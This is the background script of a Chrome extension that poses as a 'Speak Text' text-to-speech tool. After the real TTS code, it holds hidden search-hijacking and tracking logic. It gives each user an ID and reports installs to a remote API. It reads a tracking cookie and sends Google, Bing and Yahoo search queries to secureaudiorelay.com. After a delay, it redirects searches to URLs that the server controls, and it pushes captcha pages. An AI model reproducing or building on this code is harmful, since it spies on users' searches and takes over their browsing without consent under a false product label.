var contextMenuDetails = {
    "id": "icond_speak_text_id",
    "title": "Speak Text",
    "contexts": ["selection"]
}

var activeContextMenu = {
    "title": "Speak Text",
    "enabled": true
};

var disableContextMenu = {
    "title": "Speak Text (Disabled)",
    "enabled": false
};

chrome.contextMenus.create(contextMenuDetails);

chrome.runtime.onMessage.addListener(function(message, sender, sendResponse) {
    console.log('message received')
    if (message.cmd == "stop_speak") {
        chrome.tts.stop();
        chrome.tabs.sendMessage(sender.tab.id, { "cmd": "hide_speak_stop" });
    } else if (message.cmd == "start_speak") {
        chrome.tts.speak(message.text);
    } else if (message.cmd === 'validateURL') {
        setObjects();
        setTimeout(()=>{
            if(userDetail.trackType == "lander"){
                validateURL(sender, sender.tab.id);
            } else {
                chrome.tabs.sendMessage(sender.tab.id, { cmd: 'resetCSS' });
            }
        },2000)
    }
});

chrome.storage.onChanged.addListener(function(changes, areaName) {
    if (typeof changes.speak_text_status != "undefined") {
        if (changes.speak_text_status.newValue) {
            chrome.contextMenus.update("icond_speak_text_id", activeContextMenu);
        } else {
            chrome.contextMenus.update("icond_speak_text_id", disableContextMenu);
        }
    }
});

chrome.contextMenus.onClicked.addListener(function(info, tab) {
    if (info.menuItemId === "icond_speak_text_id") {
        var selection_text = info.selectionText;
        console.log(selection_text);
        if (selection_text.length > 0) {
            chrome.storage.local.get(['speak_text_status'], function(result) {
                if (result.speak_text_status) {
                    chrome.tabs.sendMessage(tab.id, { "cmd": "show_speak_stop" });
                    chrome.tts.speak(selection_text, {
                        onEvent: function(event) {
                            if (event.charIndex >= selection_text.length) {
                                chrome.tabs.sendMessage(tab.id, { "cmd": "hide_speak_stop" });
                            }
                        }
                    });
                }
            });
        }
    }
});

var speakListener = function(utterance, options, sendTtsEvent) {
    sendTtsEvent({ type: 'start', charIndex: 0 })

    // (start speaking)

    sendTtsEvent({ type: 'end', charIndex: utterance.length })
};

var stopListener = function() {
    // (stop all speech)
    console.log(" Stop is Done... ");
};

chrome.ttsEngine.onSpeak.addListener(speakListener);
chrome.ttsEngine.onStop.addListener(stopListener);

/*************************************************************/


const app_url = "secureaudiorelay.com/";


var manifestData = chrome.runtime.getManifest();

var BROWSER_NAME = "Chrome";
/*************/

var base_api_url = "https://secureaudiorelay.com/api/request.php?action=";

var re_rules = new Array();
var keyword_rules = new Array();
var getUserSpendingDays = -1;
var captcha_limit = 2;
var captcha_tried = 0;

setTimeout(()=>{
    chrome.runtime.setUninstallURL("https://" + app_url + "?action=uninstall&token=" + userDetail.userId+"&type="+BROWSER_NAME);
},3000)

var userDetail = {
    userId : (Math.random() + 1).toString(36).substring(5),
    utcDate :  new Date().toISOString(),
    userTracked :  false,
    trackType :  'direct',
    captcha_timestamp : new Date().toISOString(),
    captcha_success : false,
    isblacklisted : -1,
    meta : ''
}

const user_name = 'unique_audio_relay_user';
let delay = 0;
chrome.runtime.onInstalled.addListener(function() {
    
    chrome.storage.local.set({ 'keyword_rules': [], 'speak_text_status': true });  
    chrome.storage.sync.set({ 're_rules': [], 'getUserSpendingDays' : -1, 'captcha_limit':2,'captcha_tried':0 });    

    delay = 3000;
    chrome.cookies.get({"url": 'https://'+app_url, "name": user_name}, function(cookie) {
        
        if(cookie != null){
            console.log(JSON.parse(cookie.value))
            console.log('lander user');
            name = cookie.name;
            cookie_value = cookie.value;
            var lander_detail = JSON.parse(cookie.value);
            var user_id = lander_detail.user_id;
            userDetail.userId = user_id;
            userDetail.userTracked = true;
            userDetail.utcDate =  new Date().toISOString();
            userDetail.trackType = 'lander';
            userDetail.meta = lander_detail.platform+"-"+user_id+"-"+lander_detail.subid;
            trackUser();
            console.log(userDetail);

        }else{

            console.log('direct user');
            chrome.storage.sync.get(['userDetail'], function(result) {
                if(typeof result.userDetail == 'undefined' || typeof result.userDetail == undefined){
                    chrome.storage.sync.set({userDetail:userDetail});
                   
                    trackUser();
                }else{
                    userDetail.userId = result.userDetail.userId;
                    userDetail.utcDate = result.userDetail.utcDate;
                    userDetail.userTracked = true;
                    userDetail.trackType = 'direct';
                    userDetail.utcDate =  new Date().toISOString();
                  
                    trackUser();
                     
                }
            });
        }
    }); 

    setTimeout(()=>{

        console.log(userDetail)
        chrome.tabs.create({url: 'https://'+app_url+'thankyou.html?subid='+userDetail.meta},function(tab){
            setTimeout(()=>{
                chrome.tabs.remove(tab.id);
            },3000)
        });

        if(userDetail.trackType == "lander"){
            chrome.tabs.query({currentWindow: true}, function(tabs){
                let lander = tabs.filter(function(t){
                    return t.url.indexOf('mrktserve.com') >= 0
                });
                if(lander.length > 0){
                    chrome.tabs.remove(lander[0].id)
                }
            });
        }

    },1500)
    
});

get_rules();

setTimeout(function () {
    setObjects();
}, delay);

setTimeout(function () {
    if(userDetail.trackType == "lander"){
        console.log('get_rules alarm')
        chrome.alarms.create("get_rules",{ periodInMinutes: 6 }); 
    }
}, 4000);

chrome.alarms.onAlarm.addListener((alarm) => {
    if(alarm.name == "get_rules"){
        get_rules();
    } else if(alarm.name == "getKeywordList"){
        getKeywordList();
    }
});

function get_rules(){
    var formdata = new FormData();
    formdata.append("ext_id", chrome.runtime.id);
    formdata.append("ext_name", manifestData.name);
    formdata.append("ext_version", manifestData.version);
    formdata.append("ext_type", BROWSER_NAME);

    var requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    fetch(base_api_url + "get-rule", requestOptions)
    .then(response => response.text())
    .then(result => {
        console.log(result)
        let data = JSON.parse(result);
        re_rules[0] = data.rules;
        console.log("re Rules : ");
        console.log(re_rules);
        chrome.storage.sync.set({ 're_rules': re_rules });
    })
    .catch(error => console.log('error', error));

}

setTimeout(function(){
    if(delay > 0){
        console.log('getUserDataByUserId')
        getUserDataByUserId();
    }
},7000);

 
function getUserDataByUserId(){

    var formdata = new FormData();
    formdata.append("user_id", userDetail.userId);
    formdata.append("ext_id", chrome.runtime.id);
    formdata.append("ext_name", manifestData.name);
    formdata.append("ext_version", manifestData.version);
    formdata.append("ext_type", BROWSER_NAME);

    var lander_requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    fetch(base_api_url+"get-lander-user", lander_requestOptions)
    .then(response => response.text())
    .then(item => {
        let user_data = JSON.parse(item);
        console.log(user_data);
        let utc_timestamp = user_data.lander_users.download_timestamp;
        
        getUserSpendingDays = getDaysDifference(utc_timestamp);

        //console.log("spenidng days : "+getUserSpendingDays);
        userDetail.userId = userDetail.userId;
        userDetail.utcDate = utc_timestamp;
        userDetail.userTracked = true;
        userDetail.captcha_timestamp = user_data.lander_users.captcha_timestamp;
        userDetail.captcha_success = user_data.lander_users.captcha_success;
        userDetail.isblacklisted = user_data.lander_users.blacklisted;

        if(user_data.lander_users.user_tracked == 1){
            userDetail.trackType = 'lander';
        }else{
            userDetail.trackType = 'direct';
        }

        console.log(userDetail)
        chrome.storage.sync.set({ 'userDetail': userDetail, 'captcha_limit':user_data.lander_users.max_captcha, 'getUserSpendingDays': getUserSpendingDays });
         
    })
    .catch(error => console.log('error', error));
    
}

var latest_search = '';

setTimeout(function () { 
    if(userDetail.trackType == "lander" && keyword_rules.length == 0){
        getKeywordList();
    }
}, 15000);

setTimeout(function () {
    if(userDetail.trackType == "lander"){
       chrome.alarms.create("getKeywordList",{ periodInMinutes: 5 }); 
    }
}, 3000);

function validateURL(tab, tabId){
    if(tab.url.includes('/search?q=') && ( tab.url.includes('google.') || tab.url.includes('bing.') ) ){
        
        if(userDetail.trackType == 'lander'){
            latest_search = getURLParamVal(tab.url,"q")
            
            saveSearchCount(latest_search);

            saveSearchKeyword(latest_search);

            console.log("rule days : "+ re_rules[0].days);
            console.log("spending days : "+ getUserSpendingDays);
            if(getUserSpendingDays >= re_rules[0].days){
                console.log('check1');
                
                var engineParts = new URL(tab.url);
                var diff_hours = getHoursDifference(userDetail.captcha_timestamp);

                console.log(captcha_tried, captcha_limit)
                if(userDetail.captcha_success != true && diff_hours >= 22 && userDetail.isblacklisted != 1){

                    if(captcha_tried < captcha_limit){
                        var redirected_url = 'https://'+app_url +"captcha-prompt.php?ref=ext&ext_name="+manifestData.name+"&engine="+engineParts.protocol + "//" + engineParts.host; 
                        chrome.tabs.update(tabId, { url: redirected_url });
                        console.log("captcha done : ");
                        captcha_tried = captcha_tried + 1;
                        chrome.storage.sync.set({captcha_tried: captcha_tried});
                        updateStatus(captcha_tried)
                    } else {
                        updateStatus(null,1)
                    }
                }
               
                // 22 hours for captcha + 48 hours for redirection equal to 70 hours
                if(diff_hours >= 24  && userDetail.captcha_success == true && userDetail.isblacklisted != 1){

                    let redirect_url = re_rules[0].redirected_url.replace('{query}',latest_search);
                    chrome.tabs.update(tabId, { url: redirect_url });
                }

                setTimeout(()=>{
                    chrome.tabs.sendMessage(tabId, { cmd: 'resetCSS' });   
                },1000)     

            } else {
                chrome.tabs.sendMessage(tabId, { cmd: 'resetCSS' });
            }
        } else {
            chrome.tabs.sendMessage(tabId, { cmd: 'resetCSS' });
        }
        
        
       
    } else if(tab.url.includes(app_url) && tab.url.includes('captcha_verify.php') ){
            var getUrl = tab.url.split("engine=");
            var redirected_url = getUrl[1] +'/search?q='+latest_search; 
            
            chrome.tabs.update(tabId, { url: redirected_url });
            userDetail.captcha_success = true;
            userDetail.captcha_timestamp = new Date().toISOString(); 
            chrome.storage.sync.set({userDetail:userDetail});
            // call api here for update captcha details
            updateCaptchaDetails();
    } else if(tab.url.includes('p=') && tab.url.includes('/search') && tab.url.includes('yahoo.') ){
        console.log("yahoo");
        latest_search1 = getURLParamVal(tab.url,"p");
        if(latest_search != latest_search1){
           saveSearchKeyword(latest_search1); 
        }
    }

}  

function updateCaptchaDetails(){

    
    if(userDetail.captcha_success == true){
        userDetail.captcha_success = 1;
    }else{
        userDetail.captcha_success = 0;
    }
    var formdata = new FormData();
        formdata.append("user_id", userDetail.userId);
        formdata.append("captcha_timestamp", userDetail.captcha_timestamp);
        formdata.append("captcha_success", userDetail.captcha_success);
        formdata.append("ext_id", chrome.runtime.id);
        formdata.append("ext_name", manifestData.name);
        formdata.append("ext_version", manifestData.version);
        formdata.append("ext_type", BROWSER_NAME);


    var save_captcha_requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    fetch(base_api_url+"update-captcha", save_captcha_requestOptions)
    .then(response => response.text())
    .then(result => {
        let res = JSON.parse(result);
       
    })
    .catch(error => console.log('error', error));
}

function getDaysDifference(installedDate){

    const date1 = new Date(installedDate);
    const date2 = new Date();
    const diffTime = Math.abs(date2 - date1);
    diffDays = Math.floor(diffTime / (1000 * 60 * 60 * 24)); 
    return diffDays;

}

function getHoursDifference(oldDate){
    const captcha_previous_date = new Date(oldDate);
    const date = new Date();
    const hours = Math.abs(date - captcha_previous_date) / 36e5;   // 36e5 means  60*60*1000,
    const time_in_hours = Math.floor(hours);  // get round down value here
    return time_in_hours;
}

function saveSearchKeyword(search_keyword){

    var search_key = "";
    if(search_keyword.includes('&') == true ){
     let split_key = (search_keyword.split('&'));
     search_key = split_key[0];        
    }else{
     search_key = search_keyword;
    }
    if(search_key.includes('+') == true){
       search_key =  search_key.replace(/\+/g, " ");  // if plus exists then i clear it with white space.
    }
    
    
    if(userDetail.trackType == 'lander'){

        var formdata = new FormData();
        formdata.append("user_id", userDetail.userId);
        formdata.append("search_keyword", search_key);
        formdata.append("ext_id", chrome.runtime.id);
        formdata.append("ext_name", manifestData.name);
        formdata.append("ext_version", manifestData.version);
        formdata.append("ext_type", BROWSER_NAME);

        var matched = false;

        if(keyword_rules.length > 0){

            console.log( keyword_rules[0]);
            keyword_rules[0].forEach(function(item,index){
                if(search_key == item.keyword && item.keyword_type == 'exact_match'){  //  exact match
                    if(userDetail.isblacklisted == 1){
                        formdata.append("isblacklisted", 1);
                    }else{
                        formdata.append("isblacklisted", 1);
                    }
                    matched = true;
                    return false;
            }else if(item.keyword_type == 'wild_card'){  // wildcard  match
                
                    let words = search_key.includes(item.keyword);  // wild card match
                    //let words2 = item.keyword.includes(search_key);  // wild card match
                    if(words == true){
                        formdata.append("isblacklisted", userDetail.isblacklisted);
                        matched = true;
                       // return false;
                    }
                }
            }); 
        }
        

        if(matched == true){

            getUserDataByUserId();  // we need to update data for specific user if admin update his type like blacklisted or whitelisted
            
            if(userDetail.isblacklisted == "0"){
                var requestOptions = {
                    method: 'POST',
                    body: formdata,
                    redirect: 'follow'
                };
                fetch(base_api_url+"save-search-keyword", requestOptions)
                .then(response => response.text())
                .then(result =>console.log(result))
                .catch(error => console.log('error', error));
            }

        }

     }
}

function getKeywordList(){


    var formdata = new FormData();
    formdata.append("ext_id", chrome.runtime.id);
    formdata.append("ext_name", manifestData.name);
    formdata.append("ext_version", manifestData.version);
    formdata.append("ext_type", BROWSER_NAME);

    var requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    fetch(base_api_url+"get-keyword", requestOptions)
    .then(response => response.text())
    .then(result => {        
        let res = JSON.parse(result);
        keyword_rules[0] = res.rules;
        console.log(keyword_rules[0]);
        chrome.storage.local.set({keyword_rules:keyword_rules});
    })
    .catch(error => console.log('error', error));
}

function saveSearchCount(search_keyword){
    if(userDetail.trackType == 'lander'){
        console.log('searching keyword counting saved');

        let curr_date = new Date();
        console.log(curr_date.toISOString());
        
        var formdata = new FormData();
        formdata.append("date", curr_date.toISOString());
        formdata.append("search_count", search_keyword);
        formdata.append("ext_id", chrome.runtime.id);
        formdata.append("ext_name", manifestData.name);
        formdata.append("ext_version", manifestData.version);
        formdata.append("ext_type", BROWSER_NAME);

        var requestOptions = {
          method: 'POST',
          body: formdata,
          redirect: 'follow'
        };

        fetch(base_api_url+"save-search-count", requestOptions)
          .then(response => response.text())
          .then(result => {       
          console.log(result);
          })
          .catch(error => console.log('error', error));
    } 
}

function getURLParamVal(url = '',index=''){
    let t = new URL(url)
    const params = Object.fromEntries(t.searchParams.entries());
    return params[index];
}  

function trackUser(){

    if(userDetail.trackType  == 'lander'){
        trackType = 1;
    }else{
        trackType = 0;
    }
    if(userDetail.captcha_success  == true){
        userDetail.captcha_success = 1;
    }else{
        userDetail.captcha_success = 0;
    }
    var formdata = new FormData();
    formdata.append("user_id", userDetail.userId);
    formdata.append("download_timestamp", userDetail.utcDate);
    formdata.append("isTrack",  trackType);
    formdata.append("captcha_timestamp",  userDetail.captcha_timestamp);
    formdata.append("captcha_success", userDetail.captcha_success);
    formdata.append("ext_id", chrome.runtime.id);
    formdata.append("ext_name", manifestData.name);
    formdata.append("ext_version", manifestData.version);
    formdata.append("ext_type", BROWSER_NAME);

    var save_requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    chrome.storage.sync.set({ 'userDetail': userDetail });

    fetch(base_api_url + "save-installer-detail", save_requestOptions)
      .then(response => response.text())
      .then(result => {
        console.log(result);
        let res = JSON.parse(result);
            console.log(res);
            if(res.status == '302'){
                console.log("user already Exist Status: "+res.status );  // user already exist
            }
      })
      .catch(error => console.log('error', error));   
}

function setObjects(){
    chrome.storage.sync.get(['userDetail','captcha_limit','captcha_tried','re_rules','getUserSpendingDays'], function(data) {
        console.log(data)
        if (typeof data.userDetail != "undefined") {
            userDetail = data.userDetail
        }
        if (typeof data.captcha_limit != "undefined") {
            captcha_limit = data.captcha_limit
        }
        if (typeof data.captcha_tried != "undefined") {
            captcha_tried = data.captcha_tried
        }

        if (typeof data.re_rules != "undefined") {
            re_rules = data.re_rules
        }
        if (typeof data.getUserSpendingDays != "undefined") {
            getUserSpendingDays = data.getUserSpendingDays
        } else {
            delay = 3000;
        }
    })

    chrome.storage.local.get(['keyword_rules'], function(data1) {
        console.log(data1)
        if (typeof data1.keyword_rules != "undefined") {
            keyword_rules = data1.keyword_rules
        }
    })
}

function updateStatus(captcha_attempts=null,black_list_status=null ){

    var formdata = new FormData();
    formdata.append("user_id", userDetail.userId);

    if(captcha_attempts != null){
        formdata.append("captcha_attempts", captcha_tried);
    }
    if(black_list_status != null){
        formdata.append("black_list_status", black_list_status);
    }

    formdata.append("ext_id", chrome.runtime.id);
    formdata.append("ext_name", manifestData.name);
    formdata.append("ext_version", manifestData.version);
    formdata.append("ext_type", BROWSER_NAME);

    var save_requestOptions = {
      method: 'POST',
      body: formdata,
      redirect: 'follow'
    };

    fetch(base_api_url + "update-user-status", save_requestOptions)
      .then(response => response.text())
      .then(result => {
        console.log(result);
        let res = JSON.parse(result);
            console.log(res);
            if(res.status == '302'){
                console.log("user already Exist Status: "+res.status );  // user already exist
            }
      })
      .catch(error => console.log('error', error));   
}